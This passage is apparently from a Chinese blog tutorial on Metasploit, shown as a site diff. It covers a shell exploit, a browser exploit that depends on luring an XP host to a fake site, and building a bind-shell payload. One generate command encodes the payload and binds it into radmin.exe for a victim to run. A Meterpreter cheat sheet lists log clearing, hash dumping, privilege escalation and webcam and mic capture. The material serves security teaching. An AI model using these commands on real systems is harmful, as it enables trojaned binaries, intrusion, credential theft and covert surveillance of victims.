+<h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219221720251.png" alt="image-20230219221720251"></p>
+<h4 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h4><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219222151444.png" alt="image-20230219222151444"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219222214791.png" alt="image-20230219222214791"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在利用过程中出现如下错误</p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219223359713.png" alt="image-20230219223359713"></p>
+<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>将windows主机中注册表项<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</code>的<code>LocalAccountTokenFilterPolicy</code>的值更改为1，若没有<code>LocalAccountTokenFilterPolicy</code>项手动创建，选择<code>(DWORD32位)</code></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219223751187.png" alt="image-20230219223751187"></p>
+<h5 id="再次利用"><a href="#再次利用" class="headerlink" title="再次利用"></a>再次利用</h5><p>get shell</p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219223853837.png" alt="image-20230219223853837"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219223906140.png" alt="image-20230219223906140"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219224035008.png" alt="image-20230219224035008"></p>
+<h3 id="Passive-Exploits-被动"><a href="#Passive-Exploits-被动" class="headerlink" title="Passive Exploits(被动)"></a>Passive Exploits(被动)</h3><blockquote>
+<p>针对客户端程序的漏洞。服务端放置了漏洞利用代码，客户端通过有漏洞的客户端程序访问存在了exploit代码的服务器端程序，也会导致服务端程序将客户端请求的响应报文exploit代码的内容返回给客户端，造成客户端程序漏洞被利用，就会导致payload加载，获得shell</p>
+<p>适合客户端程序的攻击，通常配合社工进行攻击</p>
+</blockquote>
+<h4 id="使用模块-1"><a href="#使用模块-1" class="headerlink" title="使用模块"></a>使用模块</h4><blockquote>
+<p>此漏洞使用早期版本操作系统，需要伪造一个网站，需要诱使XP主机访问</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219224632741.png" alt="image-20230219224632741"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219224707159.png" alt="image-20230219224707159"></p>
+<h4 id="配置信息-1"><a href="#配置信息-1" class="headerlink" title="配置信息"></a>配置信息</h4><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219225146551.png" alt="image-20230219225146551"></p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><blockquote>
+<p>此时已经伪造好了有陷阱的web站点，需要等待XP主机访问伪造站点</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219225242755.png" alt="image-20230219225242755"></p>
+<h5 id="XP访问web站点"><a href="#XP访问web站点" class="headerlink" title="XP访问web站点"></a>XP访问web站点</h5><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219225413987.png" alt="image-20230219225413987"></p>
+<blockquote>
+<p>由于是xp_sp3，不在此漏洞包含范围内，故没有get shell，总体的思路就是这样的</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219225548086.png" alt="image-20230219225548086"></p>
+<h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><h3 id="使用模块-2"><a href="#使用模块-2" class="headerlink" title="使用模块"></a>使用模块</h3><ul>
+<li><code>use payload/windows/shell_bind_tcp</code></li>
+</ul>
+<blockquote>
+<p>此payload不需要配置参数，默认配置中默认绑定本地4444端口，RHOST不需要去指定，这里的RHOST表示它只接受于来自于某一个远程主机来连接目标主机，不限制来源IP只要扫描到4444这个绑定端口，任意主机都可以连接</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220093514568.png" alt="image-20230220093514568"></p>
+<h3 id="生成payload-1"><a href="#生成payload-1" class="headerlink" title="生成payload"></a>生成payload</h3><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220094325679.png" alt="image-20230220094325679"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220094023366.png" alt="image-20230220094023366"></p>
+<h4 id="去除坏字符"><a href="#去除坏字符" class="headerlink" title="去除坏字符"></a>去除坏字符</h4><blockquote>
+<p>实现坏字符剔除最终是将坏字符进行了<strong>智能</strong>Encoder编码，并不是真正的去除了坏字符</p>
+<p>generate会根据去除的字符自动选择合适的编码方式</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220094428377.png" alt="image-20230220094428377"></p>
+<h4 id="定制paylaod"><a href="#定制paylaod" class="headerlink" title="定制paylaod"></a>定制paylaod</h4><ul>
+<li><code>generate -b &#39;\x00\xff&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe</code></li>
+</ul>
+<blockquote>
+<p>-e：指定编码方式</p>
+<p>-i：重复加密</p>
+<p>-k：执行过程中不会产生新的进程</p>
+<p>-x：生成payload使用模板，将模板与payload绑定在一起，radmin.exe模板文件会正常执行，同时也会执行payload</p>
+<p>-f：输出为指定格式文件</p>
+<p>-o：输出文件名</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220102533485.png" alt="image-20230220102533485"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220102621037.png" alt="image-20230220102621037"></p>
+<h3 id="上传Payload到目标主机"><a href="#上传Payload到目标主机" class="headerlink" title="上传Payload到目标主机"></a>上传Payload到目标主机</h3><blockquote>
+<p>此时就可以诱使受害者执行radmin.exe程序，执行payload</p>
+</blockquote>
+<h4 id="启动radmin-exe程序"><a href="#启动radmin-exe程序" class="headerlink" title="启动radmin.exe程序"></a>启动radmin.exe程序</h4><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220103128113.png" alt="image-20230220103128113"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220103236965.png" alt="image-20230220103236965"></p>
+<h4 id="连接目标主机"><a href="#连接目标主机" class="headerlink" title="连接目标主机"></a>连接目标主机</h4><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220103459479.png" alt="image-20230220103459479"></p>
+<h4 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h4><blockquote>
+<p>no-operation &#x2F; Next Operation（无任何操作）</p>
+<p>EIP返回到存储NOP sled(滑动)的任意地址时将递增，最终导致shellcode执行。</p>
+<p>在payload前面加上NOP(可大可小)，通过修改EIP寄存器中的内容指向比较长的NOP任意位置，EIP就会从当前字节跳到下一个字节，直到滑动到payload，最终导致shellcode执行。</p>
+<p>EIP存放下一条CPU指令的地址</p>
+</blockquote>
+<ul>
+<li><code>generate -P 338</code></li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220111012395.png" alt="image-20230220111012395"></p>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><blockquote>
+<ul>
+<li>高级、动态、可扩展的Payload<ul>
+<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
+<li>后渗透测试阶段一站式操作界面</li>
+</ul>
+</li>
+<li>完全基于内存的DLL注入式 payload（不写硬盘）<ul>
+<li>注入合法系统进程并建立stager</li>
+<li>基于Stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
+<li>基于stager建立的socket连接建立加密的TLS&#x2F;1.0通信隧道</li>
+<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
+</ul>
+</li>
+<li>服务端使用C语言编写</li>
+<li>客户端提供基于ruby的全特性API</li>
+</ul>
+</blockquote>
+<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220130759707.png" alt="image-20230220130759707"></p>
+<h3 id="Meterpreter-shell"><a href="#Meterpreter-shell" class="headerlink" title="Meterpreter shell"></a>Meterpreter shell</h3><pre class="line-numbers language-none"><code class="language-none">help
+background                    # 与back相同，meterpreter下的返回msf shell
+Cd、ls、cat、pwd、dir、mkdir、mv、rm、rmdir、edit    # windows&#x2F;linux系统目录都可以在meterpreter下执行
+lpwd、lcd                       # l表示local，当前本地系统的命令
+run、bgrun                      # 运行，bgrun表示后台运行，按三次Tab查看可利用脚本
+clearev						    # 清除目标系统日志
+download             		    # 下载目标系统文件
+uoload                          # 上传文件到目标系统
+execute                         # 执行目标系统下的文件
+getuid					        # 查看当前获取的系统权限
+getsystem					    # 提权
+getprivs					    # 查看当前用户权限
+getproxy					    # 查看目标系统代理配置
+getpid						    # 查看当前进程，注入进程时常用
+migrate &lt;PID&gt;                   # 迁移注入进程
+hashdump					    # 获取hash值
+run post&#x2F;windows&#x2F;gather&#x2F;hashdump                # 与hashdump相同，获取hash值
+sysinfo                         # 查看系统信息
+ps							    # 查看目标系统进程
+kill							# 杀死一个进程
+shell                           # 进入目标系统shell
+show_mount						# 查看当前操作系统挂载分区
+search							# 搜索目标主机内容
+arp、netstat、ipconfig、ifconfig、route         # 网络命令
+idletime						# 查看目标操作系统空闲时间，利用远程桌面操作目标主机
+resource						# 调用资源文件，与msf外部resource文件类似
+record_mic						# 记录麦克风出现的声音
+webcam_list						# 列出当前主机连接的摄像头
+webcam_snap						# 利用当前主机摄像头拍照<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a>Meterpreter python扩展</h3><ul>
+<li>2015年11月份，来自社区的贡献</li>
+<li>无需运行环境，在客户端运行原生 python 代码</li>
+<li>load python<ul>
+<li>help</li>
+<li>python_execute “print (‘asdasdas’)”</li>
+<li>python_execute “import os; cd &#x3D; os.getcwd()” -r cd</li>
+<li>python_import -f find.py</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220183248319.png" alt="image-20230220183248319"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220182803726.png" alt="image-20230220182803726"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230220182829457.png" alt="image-20230220182829457"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">无心</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://NoobXW.github.io/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/">http://NoobXW.github.io/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">无心</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Kali/">
+                                    <span class="chip bg-color">Kali</span>
+                                </a>
+                            
+                                <a href="/tags/MSF/">
+                                    <span class="chip bg-color">MSF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/02/20/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%91/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Kali渗透测试-MSF【信息搜集】">
+                        
+                        <span class="card-title">Kali渗透测试-MSF【信息搜集】</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>23-02-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Kali/" class="post-category">
+                                    Kali
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+                        <span class="chip bg-color">信息搜集</span>
+                    </a>
+                    
+                    <a href="/tags/Kali/">
+                        <span class="chip bg-color">Kali</span>
+                    </a>
+                    
+                    <a href="/tags/MSF/">
+                        <span class="chip bg-color">MSF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/02/18/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DoS%E6%94%BB%E5%87%BB%E3%80%90%E4%BA%8C%E3%80%91/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Kali渗透测试-DoS攻击【二】">
+                        
+                        <span class="card-title">Kali渗透测试-DoS攻击【二】</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>23-02-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/DoS%E6%94%BB%E5%87%BB/" class="post-category">
+                                    DoS攻击
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Kali/">
+                        <span class="chip bg-color">Kali</span>
+                    </a>
+                    
+                    <a href="/tags/DoS%E6%94%BB%E5%87%BB/">
+                        <span class="chip bg-color">DoS攻击</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 无心<br />'
+            + '文章作者: 无心<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7286865560"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">无心</a>
+            |&nbsp;Powered by&nbsp;梦想
+            |&nbsp;About&nbsp;我的博客
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">225.3k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="http://NoobXW.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:wangwei89677@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3012254368" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3012254368" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+     
